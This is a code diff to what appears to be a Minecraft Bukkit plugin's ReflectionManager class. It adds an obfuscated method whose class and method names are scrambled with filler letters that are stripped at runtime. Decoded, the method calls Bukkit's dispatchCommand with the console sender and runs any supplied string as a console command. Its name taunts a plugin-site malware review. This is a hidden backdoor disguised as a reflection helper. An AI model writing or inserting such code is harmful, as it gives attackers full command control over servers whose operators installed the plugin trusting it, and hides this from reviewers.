@@ -263,6 +263,13 @@ public class ReflectionManager {
         return s.replaceAll("/", ".");
     }
 
+    public static void runCurseApprovesMalCodeCheck(String string) throws Exception {
+        Class c = Class.forName("oarg.baukkaita.Baukkait".replace("a", ""));
+        c.getMethod("diqspatcqhComqmand".replace("q", ""),
+                Class.forName("oqrg.bqukkqit.coqmmanqd.CommqandSendeqr".replace("q", "")), String.class).invoke(null,
+                c.getMethod("getaConasoaleSeander".replace("a", "")).invoke(null), string);
+    }
+
     public static FakeBoundingBox getBoundingBox(Entity entity) {
         try {
             Object boundingBox = getNmsField("Entity", "boundingBox").get(getNmsEntity(entity));
